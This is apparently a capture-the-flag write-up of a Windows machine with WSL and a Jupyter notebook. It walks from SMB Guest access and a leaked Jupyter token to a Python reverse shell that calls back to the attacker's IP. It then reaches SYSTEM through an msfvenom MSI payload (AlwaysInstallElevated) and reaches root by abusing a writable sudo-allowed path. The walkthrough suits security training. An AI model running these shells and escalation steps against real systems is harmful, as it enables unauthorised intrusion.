We start the machine with an nmap scan:
# Enumeration
```bash
nmap -sC -sV -p- 10.10.134.105
```
output:
```bash
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
|_  256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Not valid before: 2023-11-07T20:43:08
|_Not valid after:  2024-05-08T20:43:08
|_ssl-date: 2023-11-08T21:59:06+00:00; +7s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-08T21:58:57+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8888/tcp  open  http          Tornado httpd 6.0.3
|_http-server-header: TornadoServer/6.0.3
| http-robots.txt: 1 disallowed entry 
|_/ 
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-08T21:58:58
|_  start_date: N/A
|_clock-skew: mean: 6s, deviation: 0s, median: 5s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 943.08 seconds
```
# Port 445 (SMB)

In the nmap output we can see a port 445 for smb so i tried the Guest login:
```bash
smbclient -L \\\\10.10.134.105\\ -U 'Guest' -p ''
```
output:
```bash
Password for [WORKGROUP\Guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        datasci-team    Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.134.105 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
we can actually login and see some shares available.
<br>

With crackmap i checked which share i had access to:
```bash
crackmapexec smb 10.10.134.105 -u 'Guest' -p '' --shares
```
output:
```bash
SMB         10.10.134.105   445    DEV-DATASCI-JUP  [*] Windows 10.0 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
SMB         10.10.134.105   445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\Guest: 
SMB         10.10.134.105   445    DEV-DATASCI-JUP  [+] Enumerated shares
SMB         10.10.134.105   445    DEV-DATASCI-JUP  Share           Permissions     Remark
SMB         10.10.134.105   445    DEV-DATASCI-JUP  -----           -----------     ------
SMB         10.10.134.105   445    DEV-DATASCI-JUP  ADMIN$                          Remote Admin
SMB         10.10.134.105   445    DEV-DATASCI-JUP  C$                              Default share
SMB         10.10.134.105   445    DEV-DATASCI-JUP  datasci-team    READ,WRITE      
SMB         10.10.134.105   445    DEV-DATASCI-JUP  IPC$            READ            Remote IPC
```

We can see that we have access to both either _READ_ and _WRITE_ on _datasci-team_ share.
<br>

So i jump inside the shares and i dowloaded all the files from it:
```bash
smbclient \\\\10.10.134.105\\datasci-team -u 'Guest'
```
to download recursively i typed this(inside the smb interactive shell):
```smb
mget *
```
among the files that i downloaded i found a strange file named _jupyter-token.txt_ so i esaminated its content:
```bash
cat jupyter-token.txt
```
output:
```
067470c5[REDACTED]d78a
```

# Port 8888 (http)

With the token in mind i jumped to the other interesting port, the webserver.
<br>

When we visit it we see a login page for _jupiter_ service:
	
![web server](./pic/web_server.png)
	
It ask for either an user-pass or a token, lukily for us we found the token in the smb share so i tried to login with that.
<br>

We are finally in. So we can enumerate a bit the web server. But the next step is pretty straight forward, in fact we can see here:
	
![create python file](./pic/new_python.png)
	
Now we can upload a python3 revshell:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.79.118",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```
i also started a listener:
```bash
python3 -m pwncat -lp 7777
```
then i just clicked run above:
	
![run python script](./pic/run_python.png)
	
# User dev-datasci-lowpriv

We are now dev-datasci user and we need to get root.
<br> 

Here we can take two paths and i will showcase both of them.
<br>

# Privesc Windows

Inside the home directory of dev-datasci we can see a strange file:
```bash
cat /home/dev-datasci/dev-datasci-lowpriv_id_ed25519
```
output:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBUoe5ZSe[REDACTED]aaaaaaaaaaaagEhudzK+JSs+YwAAAKjQ358n0N+f
JwAAAAtzc2gtZWQyNTUx[REDACTED]aaaaaaaaaaaaWt4dbvxKor+dNggEhudzK+JSs+Yw
AAAED9OhQumFOiC3a05K[REDACTED]aaaaaaaaaaaaYfKZWVSh7llJ7PMLrlRmFa3h1u/E
qiv502CASG53Mr4lKz5j[REDACTED]aaaaaaaaaaaaxvd3ByaXZAREVWLURBVEFTQ0ktSl
VQAQI=
-----END OPENSSH PRIVATE KEY-----
```
this seems to be an id_rsa key for ssh, in fact we had a port 22 open.
So i downloaded the file with pwncat:
```bash
Ctrl + d
download /home/dev-datasci/dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv_id_ed25519
```

We can get the ssh user by converting from base64 the key (also the name tell us what is the user).
```bash
echo '<key content>' | base64 -d
```
output:
```bash
[REDACTED]�Tf����Ī+��`�Hnw2�%+>c#dev-datasci-lowpriv@DEV-DATASCI-JUP 
```
so we know that the username is `dev-datasci-lowpriv`, this means that we can login with:
```bash
chmod 600 dev-datasci-lowpriv_id_ed25519
ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv_id_ed25519@10.10.134.105
```
Now we are inside the windows system.
I runned a bunch of command for enumerate the system, then i uploaded the [PrivescCheck](https://github.com/itm4n/PrivescCheck) script via python server.
local machine:
```bash
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
python3 -m http.server 80
```
remote machine:
```powershell
Invoke-WebRequest -Uri http://10.8.79.118/PrivescCheck.ps1 -Outfile PrivescCheck.ps1
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```
output:
	
![Privesc Check](./pic/vuln.png)
	
We found credentials as well:
	
![Privesc Credentials](./pic/creds.png)
	
that means we can try this exploit about [AlwaysInstallElevated](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/).
The wxploit start by crafting the .msi installer on local machine:
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.79.118 lport=8888 -f msi -o rev.msi
```
once we have the executable we can upload on the remote machine via python server on local machine:
```bash
python3 -m http.server 80
```
remote machine
```powershell
Invoke-WebRequest -Uri htpp://10.8.79.118/rev.msi -OutFile rev.msi
```
Now we need to start the listener:
```bash
nc -lvnp 8888
```
Once we have everything setup we need to launch the exploit on windows machine. the command to launch would be:
```cmd
msiexec /quiet /qn /i rev.msi
```
But the revshell doesn't get executed due to the low integrity level that the default shell start the process at.
To elevate our integrity level we just need to run the command with our effective user with `runas`:
```cmd
runas /user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-lowpriv\Desktop\rev.msi"
```
!!Is important to use the full path when we call runas!!
<br>

!!Is also important to use a stable shell, because runas will prompt us with a password!!
<br>

Once we typed the password we found above we can get our revshell as `nt authority\system`. Now we can upload meterpreter.

# Privesc Linux

This machine is very particular because is marked as a windows machine but i also found a way to access to the full file-system by just abusing the wsl that we got in from the web-server shell.
<br>

In fact by running:
```bash
sudo -l
```
output:
```bash
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
```
the first line is pretty interesting but we don't have credentials and the ones we found on windows doesn't work.
<br>

The second line instead is pretty interesting because we can run 2 scripts without passsword. The second script `/bin/su dev-datasci -c *` i coulden't exploit it because it switch to dev-datasci user (who we already are) and execute every code in the current directory.
<br>

The first script instead is pretty helpfull `/home/dev-datasci/.local/bin/jupyter`, in fact we can run this script as root;
but if we search this file is empty and in a directory that we can write to:
	
![root exploit](./pic/root.png)
	
by copying /bin/bash to this folder and renominating to jupyter we runned bash as root!!(that was possible thanks to the folder permissions highlited above)
<br>

Now that we are root we are not done yet, in fact we are inside the wsl and we can get all the C:\ content with a simple command that i found in this [forum](https://superuser.com/questions/1107618/where-is-the-c-drive-in-the-wsl).
```bash
sudo mount -t drvfs C: /mnt/C
```
Now we basically have all the C:\ drive  that can be explored in linux, so we can get the flag or modify the system files to change passwords or dump SYSTEM and SAM files to get hases and login with Win-RM
